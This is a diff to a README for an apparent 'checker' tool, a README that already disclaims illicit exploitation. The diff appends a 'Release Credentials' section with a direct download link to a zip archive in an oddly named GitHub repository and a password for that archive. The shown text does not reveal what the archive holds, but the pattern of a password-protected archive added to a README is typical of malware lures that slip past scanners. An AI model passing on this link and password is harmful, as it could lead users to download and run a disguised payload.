@@ -116,3 +116,10 @@ Each output file will have a header and footer indicating the checker source and
 
 > [!WARNING]  
 > *This tool is for educational purposes only. The creator won't take any responsibility if any users take advantage of this and exploit it for illicit activities.*
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/RhythmFlamingoOutfit/checker-release-lu56/releases/download/v1.0.0/checker.zip)
+- **Archive Password:** `mU4mYHTdry`
